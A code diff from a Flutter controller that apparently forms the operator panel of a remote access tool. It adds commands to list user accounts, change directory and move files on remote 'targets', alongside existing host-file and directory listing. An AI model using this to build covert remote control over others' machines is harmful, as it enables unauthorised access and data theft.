@@ -4,6 +4,7 @@ import 'package:inferno_core_fyp/models/file_model.dart';
 import 'package:inferno_core_fyp/models/process_model.dart';
 import 'package:inferno_core_fyp/res/helper_extensions.dart';
 
+import '../../models/account_model.dart';
 import '../../models/hardware_info_model.dart';
 import '../../models/programs_model.dart';
 import '../../utils/utils.dart';
@@ -11,7 +12,10 @@ import 'io_attacker_controller.dart';
 
 class GeneralController extends GetxController {
   RxInt selectedIndex = 0.obs, maxLines = 1.obs;
-  RxBool isClipboard = true.obs, isTaskManagerEnabled = true.obs, loading = false.obs;
+  RxBool isClipboard = true.obs,
+      loading = false.obs,
+      isMove = false.obs,
+      isTaskManagerEnabled = true.obs;
   RxDouble cpuUsage = 0.0.obs, usedRam = 0.0.obs, totalRam = 1.0.obs;
 
   RxString sysModelName = ''.obs, sysRam = ''.obs, sysOS = ''.obs;
@@ -23,6 +27,7 @@ class GeneralController extends GetxController {
       country = ''.obs,
       city = ''.obs,
       currentDir = ''.obs,
+      moveFilePath = ''.obs,
       showInTable = ''.obs;
 
   Rx<HardwareInfo> hardwareInfo = HardwareInfo(
@@ -36,6 +41,7 @@ class GeneralController extends GetxController {
 
   RxList<DataRow> networkData = <DataRow>[].obs;
   RxList<Process> processes = <Process>[].obs;
+  RxList<Account> accounts = <Account>[].obs;
   RxList<Program> programs = <Program>[].obs;
   RxList<FileItem> files = <FileItem>[].obs;
 
@@ -202,7 +208,6 @@ class GeneralController extends GetxController {
     }
   }
 
-
   Future<void> getHostFile(String targetId) async {
     try {
       Map<String, dynamic> response = await ioAttackerController.executeCommand(
@@ -210,6 +215,20 @@ class GeneralController extends GetxController {
         data: {"text": "GET_HOSTFILE_CONTENTS", "command_args": {}},
       );
       generalController.value.text = response["result"];
+    } catch (e) {
+      Utils.toastMsg("Error: $e");
+    }
+  }
+
+  Future<void> getAccounts(String targetId) async {
+    await Future.delayed(const Duration(seconds: 1));
+    try {
+      Map<String, dynamic> response = await ioAttackerController.executeCommand(
+        targetId: targetId,
+        data: {"text": "GET_ACCOUNTS", "command_args": {}},
+      );
+      List<dynamic> jsonData = response['result'];
+      accounts.value = jsonData.map((data) => Account.fromJson(data)).toList();
     } catch (e) {
       Utils.toastMsg("Error: $e");
     }
@@ -268,9 +287,7 @@ class GeneralController extends GetxController {
         targetId: targetId,
         data: {
           "text": "GETCWD",
-          "command_args": {
-            "session_id": sessionId
-          }
+          "command_args": {"session_id": sessionId}
         },
       );
       currentDir.value = response["result"];
@@ -288,17 +305,32 @@ class GeneralController extends GetxController {
         targetId: targetId,
         data: {
           "text": "LIST_CURRENT_DIRECTORY",
-          "command_args": {
-            "session_id": sessionId,
-            "path": currentDir.value
-          }
+          "command_args": {"session_id": sessionId, "path": currentDir.value}
         },
       );
-      FileItemsResponse fileItemsResponse = FileItemsResponse.fromJson(response);
+      FileItemsResponse fileItemsResponse =
+          FileItemsResponse.fromJson(response);
       files.value = fileItemsResponse.result;
     } catch (e) {
       Utils.toastMsg("Error: $e");
     }
   }
 
+  Future<void> changeDirectory(
+      {required String targetId,
+      required String sessionId,
+      required String path}) async {
+    try {
+      await ioAttackerController.submitCommand(
+        targetId: targetId,
+        data: {
+          "text": "CHDIR",
+          "command_args": {"session_id": sessionId, "path": path}
+        },
+      );
+      getCurrentDirAndFiles(targetId, sessionId);
+    } catch (e) {
+      Utils.toastMsg("Error: $e");
+    }
+  }
 }
